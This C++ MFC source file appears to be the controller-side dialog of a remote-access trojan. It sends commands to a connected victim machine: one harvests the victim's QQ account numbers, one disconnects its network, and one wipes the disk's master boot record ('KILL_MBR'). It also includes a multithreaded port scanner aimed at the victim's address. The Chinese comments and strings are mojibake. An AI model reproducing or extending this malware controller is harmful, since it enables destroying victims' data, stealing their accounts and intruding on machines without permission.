// Mydat.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Mydat.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMydat dialog

//�̷߳��صĴ�����룬������
#define ERROR_CREATE_SOCKET		-1L
#define ERROR_MODIFY_FIONBIO	-2L
#define ERROR_SELECT			-3L
#define ERROR_SELECT_TIMEOUT	-4L

//�̷߳��ص���Ϣ
#define SCAN_THREAD				WM_USER+100
//�̷߳��ص���Ϣ��wParam��������
#define DOSCAN_FIND_PORT		1		//����һ�����Ŷ˿�
#define DOSCAN_END_PORT			2		//���һ���˿�ɨ��
#define STARTSCAN_COMPLETE		3		//�������ɨ��

//
#define MAX_SEPECIEFIED_PORTS	256		//����ɨ��ָ���Ķ˿ڵ������

//ȫ�ֱ���
HWND g_hWnd = NULL;						//������Ϣ�Ĵ��ھ��
unsigned long g_ulAddr = INADDR_NONE;	//ɨ���������ַ
DWORD g_dwTimeOut = 1000;				//���ӳ�ʱʱ�䣬��ms��
bool g_bTerminate = false;				//�Ƿ��û���������ɨ��ı�־
short g_nMaxThread = 200;				//��������ɨ���߳����������鲻�˴���200
short g_nThreadCount = 0;				//��ǰ����ɨ��Ľ�����
/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

struct tag_PORTS
{
	BOOL bSepecifiedPort;
	union
	{
		struct
		{
			unsigned short iStartPort;
			unsigned short iEndPort;			
		};
		struct
		{
			unsigned short nCount;
			unsigned short nArrOfPorts[MAX_SEPECIEFIED_PORTS];
		};		
	};
};

bool IsIpString(const char* pszHostOrIp)
{
	if (strlen(pszHostOrIp) > 15)
	{
		return false;
	}
	
	//����һ�������ַ��ĸ�������ֹ���޸�
	char szHostOrIpCopy[16];
	strcpy(szHostOrIpCopy, pszHostOrIp);
	
	int nPart = 0;
	char* pszPart = strtok(szHostOrIpCopy, ".");
	
	while (pszPart != NULL)
	{
		for (unsigned int i=0; i<strlen(pszPart); i++)
		{
			if (pszPart[i]>'9' || pszPart[i]<'0')
			{
				return false;
			}
		}
		if (unsigned int(atoi(pszPart)) > 255)
		{
			return false;
		}
		nPart++;
		pszPart = strtok(NULL, ".");
	}	
	return nPart == 4;	
}

unsigned long GetAddr(const char* pszHostOrIp)
{
	if (*pszHostOrIp == '\0')
	{
		return inet_addr("127.0.0.1");
	}
	
	if (IsIpString(pszHostOrIp))
	{
		return inet_addr(pszHostOrIp);
	}
	
	hostent* pHostent = gethostbyname(pszHostOrIp);
	if (pHostent == NULL)
	{
		return INADDR_NONE;
	}
	return  (*(unsigned long*)*pHostent->h_addr_list);
}

DWORD WINAPI DoScanPort(LPVOID lpParam)
{
	DWORD dwRet;
	short nPort = *(short*)	lpParam;
	delete lpParam;
	
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if(sock == INVALID_SOCKET)
	{
		AfxMessageBox("�����׽���ʧ��!");
		dwRet = ERROR_CREATE_SOCKET;
	}
	else
	{		
		unsigned long flag = 1; 	
		if ((ioctlsocket(sock, FIONBIO, &flag) != 0))
		{
			AfxMessageBox("δ�ܸ�Ϊ������ģʽ!");
			dwRet = ERROR_MODIFY_FIONBIO;
		}
		else
		{
			sockaddr_in severAddr;
			severAddr.sin_family = AF_INET;
			severAddr.sin_port = htons(nPort); 		
			severAddr.sin_addr.S_un.S_addr = g_ulAddr;
			connect(sock, (sockaddr*)&severAddr, sizeof(severAddr));
			
			struct fd_set mask;			
			FD_ZERO(&mask);
			FD_SET(sock, &mask);
			
			struct timeval timeout;
			timeout.tv_sec = g_dwTimeOut / 1000;
			timeout.tv_usec = g_dwTimeOut % 1000;
			
			switch(select(0, NULL, &mask, NULL, &timeout))
			{
			case -1:
				dwRet = ERROR_SELECT;
				break;
				
			case 0:
				dwRet = ERROR_SELECT_TIMEOUT;
				break;
				
			default:		
				dwRet = ERROR_SUCCESS;
			};
		}		
		closesocket(sock);
	}
	g_nThreadCount --;
	if (dwRet == ERROR_SUCCESS)
	{
		::SendMessage(g_hWnd, SCAN_THREAD, DOSCAN_FIND_PORT, nPort);
	}
	else
	{
		::SendMessage(g_hWnd, SCAN_THREAD, DOSCAN_END_PORT, nPort);
	}
	return dwRet;
}

DWORD WINAPI StartScan(LPVOID lpParam)
{	
	tag_PORTS* pScanParam = (tag_PORTS*)lpParam;
	
	DWORD dwThreadId;
	unsigned short i;
	
	if (pScanParam->bSepecifiedPort)
	{
		for(i=0; i<=pScanParam->nCount; i++)
		{
			if (g_bTerminate)	
			{
				break;	//�û��ѷ�������ɨ������
			}
			while(g_nThreadCount >= g_nMaxThread)
			{
				Sleep(10);
			}			
			
			if (CreateThread(NULL, 0, DoScanPort, (LPVOID)new short(pScanParam->nArrOfPorts[i]), 0, &dwThreadId) != NULL)
			{
				g_nThreadCount ++;
			}
		}	
	}
	else
	{		
		for(i=pScanParam->iStartPort; i<=pScanParam->iEndPort; i++)
		{
			if (g_bTerminate)	
			{
				break;	//�û��ѷ�������ɨ������
			}
			while(g_nThreadCount >= g_nMaxThread)
			{
				Sleep(10);
			}	
			
			
			if (CreateThread(NULL, 0, DoScanPort, (LPVOID)new short(i), 0, &dwThreadId) != NULL)
			{
				g_nThreadCount ++;
			}
		}
	}
	
	//�ȴ����˿�ɨ���߳̽���
	while (g_nThreadCount > 0)
	{
		Sleep(50);
	}
	::SendMessage(g_hWnd, SCAN_THREAD, STARTSCAN_COMPLETE, 0);
	delete pScanParam;
	return ERROR_SUCCESS;
}

////////////////////////////////////////////////////////////////////////////

CMydat::CMydat(CWnd* pParent,CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CMydat::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMydat)
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_iEndPort = 1024;
	m_csHostOrIp = _T("");
	m_bIsSpecifiedPort = FALSE;
	m_nMaxThread = 200;
	m_iStartPort = 1;
	m_dwTimeOut = 1000;
	//}}AFX_DATA_INIT
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_hThread = NULL;
}


void CMydat::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMydat)
	DDX_Control(pDX, IDC_PROGRESS1, m_progress);
	DDX_Control(pDX, IDC_TREE, m_ctrResultTree);
	DDX_Control(pDX, IDC_SPECIFIED_PORTS, m_ctrSpecifiedPorts);
	DDX_Control(pDX, IDC_IS_SPECIFIED_PORT, m_ctrCheck);
	DDX_Control(pDX, IDC_SCAN, m_ctrBeginScan);
	DDX_Control(pDX, IDC_EDIT_NEWDAT, m_mynewdat);
	DDX_Control(pDX, IDC_EDIT_DAT, m_mydat);
	DDX_Text(pDX, IDC_END_PORT, m_iEndPort);
	DDX_Text(pDX, IDC_HOST_OR_IP, m_csHostOrIp);
	DDX_Check(pDX, IDC_IS_SPECIFIED_PORT, m_bIsSpecifiedPort);
	DDX_Text(pDX, IDC_MAX_THREAD, m_nMaxThread);
	DDV_MinMaxUInt(pDX, m_nMaxThread, 50, 200);
	DDX_Text(pDX, IDC_START_PORT, m_iStartPort);
	DDX_Text(pDX, IDC_TIME_OUT, m_dwTimeOut);
	DDV_MinMaxDWord(pDX, m_dwTimeOut, 0, 100000);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMydat, CDialog)
	//{{AFX_MSG_MAP(CMydat)
	ON_BN_CLICKED(IDC_BUTTON_GETDAT, OnButtonGetdat)
	ON_BN_CLICKED(IDC_BUTTON_CHANGDAT, OnButtonChangdat)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON_GET_QQ, OnButtonGetQq)
	ON_BN_CLICKED(IDC_BUTTON_DISCONNECT_NETWORK, OnButtonDisconnectNetwork)
	ON_BN_CLICKED(IDC_BUTTON_KILL_DISK, OnButtonKillDisk)
	ON_BN_CLICKED(IDC_SCAN, OnScan)
	ON_BN_CLICKED(IDC_IS_SPECIFIED_PORT, OnIsSpecifiedPort)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_DESTROY()
    ON_WM_TIMER()
	//}}AFX_MSG_MAP
	ON_MESSAGE(SCAN_THREAD, OnScanThread)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMydat message handlers

BOOL CMydat::OnInitDialog() 
{
	CDialog::OnInitDialog();
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("���ӹ���\\\\%s", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	// TODO: Add extra initialization here
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
///////////////////////////////////////////////////////////////////////////////////
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	m_pProgressCtrl = (CProgressCtrl*)GetDlgItem(IDC_PROGRESS1);
	m_pProgressCtrl->SetStep(1);
	ReadDefaultPorts();
//	SetDlgItemText(IDC_HOST_OR_IP,inet_ntoa(sockAddr.sin_addr));
	m_csHostOrIp = inet_ntoa(sockAddr.sin_addr);
	UpdateData(false);
	
	WSADATA wsaData;	
	BOOL ret = WSAStartup(MAKEWORD(2,2), &wsaData);
	if(ret != 0)
	{
		MessageBox("��ʼ������Э��ʧ��!");
		return -1;
	}	





	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CMydat::OnSysCommand(UINT nID, LPARAM lParam)
{

		CDialog::OnSysCommand(nID, lParam);
	
}


void CMydat::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting
		
		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);
		
		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		
		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

HCURSOR CMydat::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

//////////////////////////////////////////////////////////////////////////////////////////////
void CMydat::OnReceiveComplete()
{	
	//	m_edit.SetWindowText("");
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	//	char Text[256];		
	//	GetDlgItemText(IDC_EDIT_CHAT,Text,sizeof(Text));
	SetDlgItemText(IDC_EDIT_DAT,strResult);
	m_mydat.SetSel(strlen(strResult),strlen(strResult),FALSE);
}


void CMydat::OnButtonGetdat() 
{
	// TODO: Add your control notification handler code here
	BYTE bToken = COMMAND_CHAT_CLOSE;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	
}

void CMydat::OnButtonChangdat() 
{
	// TODO: Add your control notification handler code here
	char str[250];
	GetDlgItemText(IDC_EDIT_NEWDAT,str,sizeof(str));
	if (strcmp(str,"")==0)
	{
		return;
	}
	m_iocpServer->Send(m_pContext, (LPBYTE)str,strlen(str));
	
}

void CMydat::OnButtonGetQq() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_GETQQNUM;
	m_iocpServer->Send(m_pContext, (PBYTE)&bToken, sizeof(BYTE));
	
}

void CMydat::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	
	//	MessageBox("���");
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}


void CMydat::OnButtonDisconnectNetwork() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_DISCONT;
	m_iocpServer->Send(m_pContext, (PBYTE)&bToken, sizeof(BYTE));
	
}

void CMydat::OnButtonKillDisk() 
{
	// TODO: Add your control notification handler code here
	if (MessageBox("����Ӳ�̺󽫶�ʧһ������,ȷ����?", "����", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_KILL_MBR;
	m_iocpServer->Send(m_pContext, (PBYTE)&bToken, sizeof(BYTE));
	
}

void CMydat::OnScan() 
{
	// TODO: Add your control notification handler code here
	if (m_hThread == NULL)
	{
		UpdateData();
		
		if ((g_ulAddr = GetAddr(m_csHostOrIp)) == INADDR_NONE)
		{
			AfxMessageBox("�޷��ҵ�����");
			return;
		}
		
		m_nHasComplete = 0;
		m_dwPercentSeconds = 0;
		m_pProgressCtrl->SetPos(0);		
		m_hParentTree = m_ctrResultTree.InsertItem(m_csHostOrIp+CTime::GetCurrentTime().Format("---ɨ��ʱ��%H:%M:%S"));
		
		g_bTerminate = false;
		g_dwTimeOut = m_dwTimeOut;
		g_hWnd = m_hWnd;
		g_nMaxThread = m_nMaxThread;
		g_nThreadCount = 0;
		
		tag_PORTS* pScanParam = new tag_PORTS;
		pScanParam->bSepecifiedPort = m_bIsSpecifiedPort;		
		if (m_bIsSpecifiedPort)
		{
			//ָ���˿�
			short nCount = 0;
			char buff[10];
			for(int i=0; i<m_ctrSpecifiedPorts.GetLineCount(); i++)
			{
				int len = m_ctrSpecifiedPorts.GetLine(i, buff, 9);
				if (len != 0)
				{
					buff[len] = '\0';
					pScanParam->nArrOfPorts[nCount++]= atoi(buff);
				}
			}
			pScanParam->nCount = nCount;
			m_pProgressCtrl->SetRange(0, pScanParam->nCount);
		}
		else
		{		
			pScanParam->iStartPort = m_iStartPort;
			pScanParam->iEndPort = m_iEndPort;
			m_pProgressCtrl->SetRange(0, m_iEndPort-m_iStartPort+1);
		}
		
		DWORD dwThreadId;
		m_hThread = CreateThread(NULL, 0, StartScan, (LPVOID)pScanParam, 0, &dwThreadId);
		m_ctrBeginScan.SetWindowText("����ɨ��");
		SetTimer(1, 100, NULL);
	}
	else if (!g_bTerminate)
	{
		g_bTerminate = TRUE;
		m_ctrBeginScan.SetWindowText("���ڽ���...");
	}
}

void CMydat::OnIsSpecifiedPort() 
{
	// TODO: Add your control notification handler code here
	BOOL bCheck = m_ctrCheck.GetCheck();
	m_ctrSpecifiedPorts.EnableWindow(bCheck);
}

void CMydat::OnDestroy() 
{
	TerminateThread(m_hThread, 0);
	m_hThread = NULL;	
	KillTimer(1);
	SaveDefaultPorts();
	
	WSACleanup();
	CDialog::OnDestroy();	
}

void CMydat::OnTimer(UINT nIDEvent) 
{
	if (nIDEvent == 1)
	{
		CString s;
		m_dwPercentSeconds++;
		s.Format("��ʱ%3d.%1d��", m_dwPercentSeconds/10, m_dwPercentSeconds%10);
		GetDlgItem(IDC_TIME)->SetWindowText(s);
		
		m_pProgressCtrl->SetPos(m_nHasComplete);
	}
	CDialog::OnTimer(nIDEvent);
}

void CMydat::OnScanThread(WPARAM wParam, LPARAM lParam)
{
	char buff[10];
	switch(wParam)
	{
	case DOSCAN_FIND_PORT:
		sprintf(buff, "%d", short(lParam));
		m_ctrResultTree.InsertItem(buff, m_hParentTree);
		m_ctrResultTree.Expand(m_hParentTree, TVE_EXPAND);
		
	case DOSCAN_END_PORT:
		m_nHasComplete++;
		break;
		
	case STARTSCAN_COMPLETE:
		m_hThread = NULL;
		m_ctrBeginScan.SetWindowText("��ʼɨ��");
		KillTimer(1);
//		AfxMessageBox("����ɨ�����");
		break;
		
	default:
		break;		
	}
}

BOOL CMydat::PreTranslateMessage(MSG* pMsg) 
{
	//����س���
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return 0;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CMydat::ReadDefaultPorts()
{	
	try
	{
		CStdioFile f("DefaultPorts.txt", CFile::modeRead|CFile::typeText);
		CString s, ss;
		while (f.ReadString(ss))
		{
			s += ss;
			s += "\r\n";
		}
		GetDlgItem(IDC_SPECIFIED_PORTS)->SetWindowText(s);
		f.Close();
	}
	catch(...)
	{
		CString s = "13\r\n37\r\n123\r\n135\r\n139\r\n489\r\n1002\r\n3389\r\n1100";		
		GetDlgItem(IDC_SPECIFIED_PORTS)->SetWindowText(s);	
	}
}

void CMydat::SaveDefaultPorts()
{
	CStdioFile f("DefaultPorts.txt", CFile::modeCreate|CFile::modeWrite|CFile::typeText);
	char buff[10];
	for(int i=0; i<m_ctrSpecifiedPorts.GetLineCount(); i++)
	{
		int len = m_ctrSpecifiedPorts.GetLine(i, buff, 9);
		if (len != 0)
		{
			buff[len] = '\0';			
			f.WriteString(buff);
			f.WriteString("\r\n");
		}
	}
	f.Close();	
}
